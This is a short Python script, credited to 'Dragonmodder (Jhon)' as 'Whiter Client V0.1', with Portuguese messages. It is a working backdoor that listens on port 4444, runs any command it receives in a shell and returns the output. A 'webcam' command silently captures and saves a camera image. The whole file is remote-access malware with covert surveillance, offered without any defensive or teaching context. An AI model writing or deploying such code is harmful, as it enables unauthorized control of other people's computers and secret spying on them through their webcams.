# By Dragonmodder (Jhon) - Whiter Client V0.1

import socket
import subprocess
import os
import cv2

HOST = '0.0.0.0'
PORT = 4444

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)

print(f'[+] Aguardando conexão na porta {PORT}...')
client, addr = server.accept()
print(f'[+] Conectado por {addr}')

def abrir_webcam():
    cam = cv2.VideoCapture(0)
    if not cam.isOpened():
        client.send(b'Erro: Webcam nao pode ser acessada.')
        return
    ret, frame = cam.read()
    if ret:
        cv2.imwrite("webcam.jpg", frame)
        client.send(b'[+] Imagem da webcam salva como webcam.jpg')
    else:
        client.send(b'Erro ao capturar imagem.')
    cam.release()

while True:
    comando = client.recv(1024).decode()
    if comando.lower() == 'exit':
        break
    elif comando.startswith('cd '):
        try:
            os.chdir(comando[3:])
            client.send(f'Diretório alterado para {os.getcwd()}'.encode())
        except FileNotFoundError:
            client.send(b'Diretório não encontrado.')
    elif comando == 'webcam':
        abrir_webcam()
    else:
        resultado = subprocess.getoutput(comando)
        client.send(resultado.encode())

client.close()
server.close()
